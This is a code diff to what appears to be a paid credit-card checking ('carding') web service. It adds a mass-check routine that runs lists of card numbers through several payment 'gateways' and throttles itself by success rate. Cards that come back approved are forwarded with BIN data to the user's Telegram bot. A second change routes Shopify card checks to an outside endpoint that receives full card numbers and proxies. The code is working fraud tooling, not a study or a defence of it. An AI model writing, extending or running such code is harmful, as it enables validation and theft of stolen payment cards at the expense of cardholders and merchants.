@@ -812,6 +812,102 @@ def mass_check():
             error_msg = f'Insufficient credits. You have {user["credits"]} but need {card_count}'
             yield f"data: {json.dumps({'error': error_msg})}\n\n"
         return Response(stream_with_context(error_generate()), mimetype="text/event-stream")
+
+    # Deduct credits for all cards upfront
+    new_credits = update_user_credits(session["telegram_id"], -card_count)
+    session["credits"] = new_credits
+
+    def generate():
+        processed_count = 0
+        successful_checks = 0
+        
+        for i, card_data in enumerate(card_list):
+            try:
+                result = None
+                
+                # Use ONLY the selected gateway - NO FALLBACK
+                if gateway == "au":
+                    result = safe_process_card(process_card_au, card_data, timeout=10)
+                elif gateway == "chk":
+                    result = safe_process_card(check_card, card_data, timeout=10)
+                elif gateway == "vbv":
+                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
+                elif gateway == "b3":
+                    result = safe_process_card(process_card_b3, card_data, timeout=10)
+                elif gateway == "svb":
+                    result = safe_process_card(process_card_svb, card_data, timeout=10)
+                elif gateway == "pp":
+                    result = safe_process_card(process_card_pp, card_data, timeout=10)
+                else:
+                    result = {"status": "Error", "response": "Invalid gateway", "gateway": "N/A"}
+
+                res_data = {
+                    "card": card_data,
+                    "status": result.get("status", "Error"),
+                    "response": result.get("response", "Unknown error"),
+                    "gateway": result.get("gateway", gateway.upper()),
+                }
+
+                # Update user stats and log the card
+                update_user_stats(session["telegram_id"], res_data["status"])
+                log_card(session["telegram_id"], card_data, res_data["status"], 
+                         res_data["gateway"], res_data["response"])
+
+                # Count successful checks (non-error responses)
+                if result.get("status") != "Error":
+                    successful_checks += 1
+
+                # Send approved to user bot
+                if res_data["status"].lower() == "approved":
+                    try:
+                        bin_number = card_data[:6]
+                        bin_info = {}
+                        try:
+                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
+                            if r.status_code == 200:
+                                bin_info = r.json()
+                        except:
+                            pass
+                            
+                        send_card_to_user_bot(
+                            session["telegram_id"],
+                            {
+                                "card": card_data,
+                                "status": res_data["status"],
+                                "response": res_data["response"],
+                                "gateway": res_data["gateway"],
+                                "bin": bin_info,
+                                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                            },
+                        )
+                    except Exception as bot_error:
+                        print(f"Bot notification failed: {bot_error}")
+
+                processed_count += 1
+                yield f"data: {json.dumps(res_data)}\n\n"
+
+                # Dynamic delay based on success rate
+                if successful_checks / max(1, processed_count) > 0.7:
+                    time.sleep(0.3)
+                else:
+                    time.sleep(1.0)
+
+            except Exception as e:
+                # Log the error but continue with next card
+                error_data = {
+                    "card": card_data,
+                    "status": "Error",
+                    "response": f"Processing failed: {str(e)}",
+                    "gateway": gateway.upper(),
+                }
+                yield f"data: {json.dumps(error_data)}\n\n"
+                time.sleep(1.0)  # Longer delay after error
+                continue
+
+        # Send completion message
+        yield f"data: {json.dumps({'complete': True, 'processed': processed_count, 'total': card_count, 'successful': successful_checks})}\n\n"
+
+    return Response(stream_with_context(generate()), mimetype="text/event-stream")
     
 @app.route('/save_bot', methods=['POST'])
 def save_bot():
@@ -917,7 +1013,7 @@ def shopify_check_process():
                     }
             
             # Prepare the API URL
-            api_url = f"http://gxf.b9f.mytemp.website/autog.php?site={site}&cc={card}"
+            api_url = f"https://autoshopify.stormx.pw/index.php?site={site}&cc={card}"
             if proxy:
                 api_url += f"&proxy={proxy}"
             
